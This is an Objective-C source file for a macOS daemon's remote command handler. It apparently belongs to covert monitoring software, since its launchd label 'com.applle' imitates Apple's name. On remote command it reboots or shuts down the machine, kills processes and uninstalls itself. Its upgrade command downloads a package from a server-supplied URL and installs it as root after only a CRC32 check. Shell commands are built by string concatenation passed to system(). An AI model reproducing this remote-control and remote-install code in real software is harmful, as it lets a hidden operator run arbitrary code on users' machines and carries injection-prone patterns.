//
//  RCHandler.m
//  blbld
//
//  Created by Makara Khloth on 10/13/16.
//
//

#import "RCHandler.h"
#import "RCCommand.h"
#import "blblwController.h"

#import "CRC32.h"
#import "blbldUtils.h"
#import "AppTerminateMonitor.h"

#define kCmdRestart         @"147"
#define kCmdRestartClient   @"148"
#define kCmdShutDown        @"149"

#define kCmdUninstall       @"200"
#define kCmdUpgrade         @"226"

#define kCmdSendDebugLog    @"400"

@implementation RCHandler

+ (void) handleCommand: (RCCommand *) command {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
        if ([command.cmdCode isEqualToString:kCmdRestart]) {
            [self restart:command];
        }
        else if ([command.cmdCode isEqualToString:kCmdRestartClient]) {
            [self restartClient:command];
        }
        else if ([command.cmdCode isEqualToString:kCmdShutDown]) {
            [self shutDown:command];
        }
        else if ([command.cmdCode isEqualToString:kCmdUninstall]) {
            [self uninstall:command];
        }
        else if ([command.cmdCode isEqualToString:kCmdUpgrade]) {
            [self upgrade:command];
        }
        else if ([command.cmdCode isEqualToString:kCmdSendDebugLog]) {
            [self sendDebugLog:command];
        }
    });
}

#pragma mark - Handle commands

+ (void) restart: (RCCommand *) command {
    // <147>
    [self stopAppMonitor];
    
    [blbldUtils reboot];
}

+ (void) restartClient: (RCCommand *) command {
    // <148>
    [self stopAppMonitor];
    
    blblwController *controller = [blblwController sharedblblwController];
    NSString *blbld = [controller.launchArgs objectAtIndex:7];
    NSString *blblu = [controller.launchArgs objectAtIndex:2];
    NSString *kbls = [controller.launchArgs objectAtIndex:5];
    NSString *uamu = [controller.launchArgs objectAtIndex:8];
    
    NSString *cmd = @"killall -9 ";
    system([[cmd stringByAppendingString:blbld] UTF8String]);
    system([[cmd stringByAppendingString:blblu] UTF8String]);
    system([[cmd stringByAppendingString:kbls] UTF8String]);
    system([[cmd stringByAppendingString:uamu] UTF8String]);
    
    [controller restartAll];
}

+ (void) shutDown: (RCCommand *) command {
    // <149>
    [self stopAppMonitor];
    
    [blbldUtils shutdown];
}

+ (void) uninstall: (RCCommand *) command {
    // <200>
    [self stopAppMonitor];
    
    blblwController *controller = [blblwController sharedblblwController];
    NSString *uninstall = [controller.launchArgs objectAtIndex:9];
    NSString *cmd = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.unload -p %@ start", uninstall];
    system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
}

+ (void) upgrade: (RCCommand *) command {
    // <226><version><checksum><url>
    NSURL *url = nil;
    NSString *checksum = nil;
    NSString *version = nil;
    if (command.cmdArgs.count > 3) {
        url = [NSURL URLWithString:[command.cmdArgs objectAtIndex:3]];
    }
    if (command.cmdArgs.count > 2) {
        checksum = [command.cmdArgs objectAtIndex:2];
    }
    
    if (command.cmdArgs.count > 1) {
        version = [command.cmdArgs objectAtIndex:1];
    }
    
    if (url && checksum) {
        NSData *binaryData = [NSData dataWithContentsOfURL:url];
        
        DLog(@"url : %@", url);
        DLog(@"binaryData : %lu", (unsigned long)(binaryData.length));
        
        if (binaryData && binaryData.length > 0) {
            uint32_t binaryCRC32 = [CRC32 crc32:binaryData];
            
            NSNumberFormatter *formatter = [[NSNumberFormatter alloc] init];
            formatter.numberStyle = NSNumberFormatterDecimalStyle;
            NSNumber *yourCRC32 = [formatter numberFromString:checksum];
            uint32_t crc32 = (uint32_t)[yourCRC32 unsignedIntegerValue];
            
            if (binaryCRC32 == crc32) {
                DLog (@"Url update, CRC MATCH, so go ahead to update the software");
                [self stopAppMonitor];
                
                NSString *binaryName = [url lastPathComponent];
     
                if ([binaryName rangeOfString:@".pkg"].location == NSNotFound) {
                    //use temp file name if download link didn't come with valid file name
                    binaryName = [NSString stringWithFormat:@"update-%@.pkg",version];
                }
                
                DLog(@"binaryName %@", binaryName);
                
                NSString *tmpAppPath = [NSString stringWithFormat:@"/tmp/%@", binaryName];
                [binaryData writeToFile:tmpAppPath atomically:YES];
                
                NSString *cmdUpgrade = [NSString stringWithFormat:@"sudo installer -pkg %@ -target /", tmpAppPath];
                system([cmdUpgrade cStringUsingEncoding:NSUTF8StringEncoding]);
                
                NSString *deleteAppPath = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
                [[NSFileManager defaultManager] removeItemAtPath:deleteAppPath error:nil];
            }
        }
    }
}

+ (void) sendDebugLog: (RCCommand *) command {
    // <400><r1><r2>....<rn>
    @try {
        NSArray *receivers = nil;
        if (command.cmdArgs.count > 1) {
            NSRange range = NSMakeRange(1, command.cmdArgs.count - 1);
            receivers = [command.cmdArgs subarrayWithRange:range];
        }
        
        blblwController *controller = [blblwController sharedblblwController];
        [controller sendDebugLogToRecipients:receivers];
    }
    @catch (NSException *exception) {
        DLog(@"Get debug log recipients exception : %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark - Utils

+ (void) stopAppMonitor {
    blblwController *controller = [blblwController sharedblblwController];
    [controller.blbluMonitor stop];
    [controller.kblsMonitor stop];
}

@end
